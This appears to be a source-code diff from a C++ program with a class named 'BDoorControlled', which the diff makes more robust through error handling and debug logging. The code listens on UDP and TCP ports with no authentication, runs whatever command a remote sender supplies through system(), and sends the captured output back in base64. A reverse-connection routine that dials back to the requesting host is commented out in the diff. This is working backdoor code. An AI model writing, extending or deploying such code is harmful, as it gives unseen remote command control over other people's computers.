@@ -4,6 +4,7 @@
 #include<vector>
 #include <other\tools.h>
 #define CMD_RETURN_TXT_NAME "cmd_return.txt"
+#define CMDERROR "cmd命令执行失败"
 class Command {
 private:
 	const string name = "command";
@@ -19,52 +20,33 @@ public:
 	virtual string GetName() = 0;
 };
 int run_cmd_with_txt(string cmd_command, string& mess) {
-
-	/*平替方案*/
-
 	fstream fst;
 	fst.open(CMD_RETURN_TXT_NAME, ios::trunc | ios::out);
 	if (!fst.is_open()) {
-
-		cout << "文件打开失败" << endl;
-		return 0;
-
+		DebugLog("文件打开失败");
+		return -1;
 	}
-	else {
-
-		cout << "文件打开成功" << endl;
-
-	}
+	else {DebugLog("文件打开成功");}
 	fst.close();
-
 	cmd_command += string(" >> ") + CMD_RETURN_TXT_NAME;
-	system(cmd_command.data());
-
+	if (system(cmd_command.data()) == -1) {
+		mess = CMDERROR;
+		DebugLog("cmd命令执行失败");
+		return -1;
+	}
 	ifstream ifs;
 	ifs.open(CMD_RETURN_TXT_NAME, ios::in);
 	string remess = "\n";
 	string buf;
-	while (getline(ifs, buf)) {
-
-		remess += buf + string("\n");
-
-	}
+	while (getline(ifs, buf)) {remess += buf + string("\n");}
 	mess = remess;
 	ifs.close();
-	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {
-
-		cout << "成功删除文件" << endl;
-
-	}
+	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {DebugLog("成功删除文件");}
 	else {
-
-		cout << "无法删除文件" << endl;
-		return 0;
-
+		DebugLog("无法删除文件");
+		return -1;
 	}
-
 	return 1;
-
 }
 class CallHost : public Command{
 private:
@@ -103,14 +85,17 @@ private:
 		int Func(string command) override {
 			json command_json = json::parse(command);
 			if (command_json[COMMANDNAME] == name) {
-				cout << "cmd调用" << endl;
+				DebugLog("cmd调用");
 				string returnmess;
-				run_cmd_with_txt(command_json[CONTENT], returnmess);
-				udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
-				cout << returnmess << endl;
+				if(run_cmd_with_txt(command_json[CONTENT], returnmess) == -1){
+					returnmess = CMDERROR;
+				}
+				int Result = udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
+				if (Result == -1) { DebugLog(SENDERROR); }
+				else if (Result == 0) { DebugLog(DISCONNECT); }
+				DebugLog(returnmess);
 				return 1;
 			}
-			cout << command_json[COMMANDNAME] << endl;
 			return 0;
 		}
 		string GetName()override { return name; }
@@ -122,17 +107,20 @@ private:
 	vector<RemoteCommand*> remote_command_list = { &cmd };
 public:
 	int Func()override {
-		cout << "UDP线程启动" << endl;
+		DebugLog("UDP线程启动");
 		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		udp_addr.sin_family = AF_INET;
 		udp_addr.sin_port = htons(UDP_PORT);
 		udp_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(udp_socket, (const sockaddr*)&udp_addr, sizeof(udp_addr));
 		while (true) {
+			int Result;
 			string recvmess;
-			cout << "等待接收" << endl;
-			udp::RecvfromBase64(udp_socket, sender_addr, recvmess);
-			cout << inet_ntoa(sender_addr.sin_addr) << "/UDP>" << recvmess << endl;
+			DebugLog("等待接收");
+			Result = udp::RecvfromBase64(udp_socket, sender_addr, recvmess);
+			if (Result == -1) { DebugLog(RECVERROR); }
+			else if (Result == 0) { DebugLog(DISCONNECT); }
+			DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + "/UDP>" + recvmess);
 			for (int i = 0; i < remote_command_list.size(); i++) {
 				remote_command_list[i]->Func(recvmess);
 			}
@@ -153,12 +141,20 @@ private:
 		int Func(string command)override {
 			json command_json = json::parse(command);	
 			if (command_json[COMMANDNAME] == name) {
-				cout << "cmd调用" << endl;
 				string returnmess;
-				run_cmd_with_txt(command_json[CONTENT], returnmess);
-				string sendmess = FormatJson(name, EncodeStrInBase64( returnmess)).dump();
-				tcp::SendBase64(connect_socket, sendmess);
-				cout << returnmess << endl;
+				if (run_cmd_with_txt(command_json[CONTENT], returnmess) == -1) {
+					returnmess = CMDERROR;
+				}
+				int Result = tcp::SendBase64(connect_socket, FormatJson(name, EncodeStrInBase64(returnmess)).dump());
+				if (Result == -1) {
+					DebugLog(SENDERROR);
+					return -1;
+				}
+				else if (Result == 0) {
+					DebugLog(DISCONNECT);
+					return -1;
+				}
+				DebugLog(returnmess);
 				return 1;
 			}
 			return 0;
@@ -171,30 +167,39 @@ private:
 	vector<RemoteCommand*> remote_command_list = { &cmd };
 public:
 	int Func() override{
-		cout << "TCP线程启动" << endl;
+		DebugLog("TCP线程启动");
 		SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		sockaddr_in listen_addr;
 		listen_addr.sin_family = AF_INET;
 		listen_addr.sin_port = htons(TCP_PORT);
 		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
-		thread(&TCP::ReverseConnect,this).detach();
+		//thread(&TCP::ReverseConnect,this).detach();
+		listen(listen_socket,5);
 		while (true) {
-			listen(listen_socket,5);
 			sockaddr_in connect_addr;
 			int connect_addr_len = sizeof(connect_addr);
 			connect_socket = accept(listen_socket, (sockaddr*)&connect_addr, &connect_addr_len);
-			cout << inet_ntoa(connect_addr.sin_addr) << endl;
+			DebugLog(inet_ntoa(connect_addr.sin_addr));
 			string recvmess;
-			tcp::RecvBase64(connect_socket, recvmess);
-			cout << inet_ntoa(connect_addr.sin_addr) << "/TCP>" << recvmess << endl;
+			int Result = tcp::RecvBase64(connect_socket, recvmess);
+			if (Result == -1) {
+				DebugLog(RECVERROR);
+				continue;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT);
+				continue;
+			}
+			DebugLog(string(inet_ntoa(connect_addr.sin_addr)) + "/TCP>" + recvmess);
 			for (int i = 0; i < remote_command_list.size(); i++) {
 				remote_command_list[i]->Func(recvmess);
 			}
 		}
 	}
-	int ReverseConnect() {
-		cout << "反向TCP线程启动" << endl;
+	/*int ReverseConnect() {
+		int Result;
+		DebugLog("反向TCP线程启动");
 		SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		sockaddr_in reverse_addr;
 		reverse_addr.sin_family = AF_INET;
@@ -202,29 +207,45 @@ public:
 		reverse_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(reverse_socket, (const sockaddr *)&reverse_addr, sizeof(reverse_addr));
 		while (true) {
-			sockaddr_in sender_addr;
 			string recvmess;
-			udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
-			cout << inet_ntoa(sender_addr.sin_addr) << ": 反向连接请求" << endl;
+			sockaddr_in sender_addr;
+			Result = udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
+			if (Result == -1) {
+				DebugLog(RECVERROR);
+				continue;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT); 
+				continue;
+			}
 			json requestmess;
 			requestmess.parse(recvmess);
 			if (requestmess[COMMANDNAME] == name) {
-				if (requestmess[CONTENT] == "reverse_connect") {
+				if (requestmess[CONTENT] == REVERSECONNECT) {
+					DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + ": 反向连接请求");
 					connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 					sockaddr_in addr;
 					addr.sin_family = AF_INET;
 					addr.sin_port = htons(TCP_PORT);
 					addr.sin_addr.s_addr = inet_addr(inet_ntoa(sender_addr.sin_addr));
 					connect(connect_socket, (const sockaddr*)&addr, sizeof(addr));
-					tcp::RecvBase64(connect_socket, recvmess);
-					cout << inet_ntoa(addr.sin_addr) << "/TCP>" << recvmess << endl;
+					int Result = tcp::RecvBase64(connect_socket, recvmess);
+					if (Result == -1) {
+						DebugLog(RECVERROR);
+						return ERROR;
+					}
+					else if (Result == 0) {
+						DebugLog(DISCONNECT);
+						return ERROR;
+					}
+					DebugLog(string(inet_ntoa(addr.sin_addr)) + "/TCP>" + recvmess);
 					for (int i = 0; i < remote_command_list.size(); i++) {
 						remote_command_list[i]->Func(recvmess);
 					}
 				}
 			}
 		}	
-	}
+	}*/
 	string GetName()override { return name; }
 };
 class BDoorControlled {
